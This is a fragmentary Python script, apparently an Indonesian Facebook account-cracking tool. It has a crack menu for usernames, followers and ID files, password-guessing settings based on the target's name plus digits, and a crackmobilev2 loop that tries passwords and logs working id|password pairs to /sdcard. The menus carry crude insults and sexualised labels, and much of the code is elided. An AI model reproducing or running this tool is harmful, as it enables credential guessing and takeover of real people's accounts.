...
[bold cyan]/_/|_|\___/   /_/_/|_/_/ |_/_/  /_/\____/____/  | SOURCE CODE : PREMIUM
				...
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					...
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						...
						if 'Sukses!' in str(response6):
							...
							print("\n ╰─  Login Berhasil | python premium.py");exit()
			except Exception as e:
...
#----------------------[ MENU CRACK V2 ]----------------------#
def lainnya():
	cetak(panel(f"[01] Crack Username [[bold green] ON [bold white]]                  [03] Crack File [[bold green] ON [bold white]]\n[02] Crack Followers [[bold green] ON [bold white]]                 [04] Kembali Ke Awal [[bold green] ON [bold white]]",width=90,title=f"[bold green]Menu Crack",padding=(0,8),style=f"bold cyan"))
	bray = input(f' ╰─  Pilih Menu Crack : ')
	if bray in(''):
		print(' ╰─  Pilih Yang Bener Asu ');back()
	if bray in('1','01'):
...
def setting():
	...
	if hu in ['1','01']:
		...
		exit()
	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold white]Metode JANDA☺️☺️ [[bold green]Very Recommended[bold white]][/]\n[bold white][[bold green]02[/][bold white]][/] [bold white]Metode DUDA😉😉 [[bold green]Recommended[bold white]][/]\n[bold white][[bold green]03[/][bold white]][/] [bold white]Metode PERAWAN😋🤤😍😏 [[bold green] Recommended[bold white]][/]\n[bold white][[bold green]04[/][bold white]][/] [bold white]Metode JAHE😏😍😍 [[bold green] Recommended[bold white]][/]\n[bold white][[bold green]05[/][bold white]][/] [bold white]Metode🤬🤬🤬 [[bold green]Recommended[bold white]][/]\n[bold white][[bold green]06[/][bold white]][/] [bold white]Metode🤨🤨🤨 [[bold green] Recommended[bold white]][/][bold white][[bold green]07[/][bold white]][/] [bold white]Metode🤢🤢🤢 [[bold green]Very Recommended[bold white]][/]\n[bold white][[bold green]08[/][bold white]][/] [bold white]Metode  [[bold 🔥🔥reen]Very Recommended[bold white]][/]\n[bold white][[bold green]01[/][bold white]][/] [bold white]Metode Mobile V1[bold white][[bold green]01[/][bold white]][/] [bold white]Metode Mobile V1 [[bold green]Very Recommended[bold white]][/][bold white][[bold green]01[/][bold white]][/] [bold white]Metode Mobile V1 [[bold green]Very Recommended[bold white]][/][bold white][[bold green]09[/][bold white]][/] [bold white]Metode👽👽👽 [[bold green]Very Recommended[bold white]][/] [[bold green]Very Recommended[bold white]][/]',width=90,title=f"[bold green]Setting Metode",style=f"bold cyan"))
...
[bold white][[bold green]03[bold white]] [bold white]Nama, Nama123, Nama1234, Nama12345 + Manual [[bold green]Very Recommended[bold white]]''',style='bold cyan',title='[bold green]Setting Password',width=90))
...
def crackmobilev2(idf,pwv):
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}')
				open('/sdcard//sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
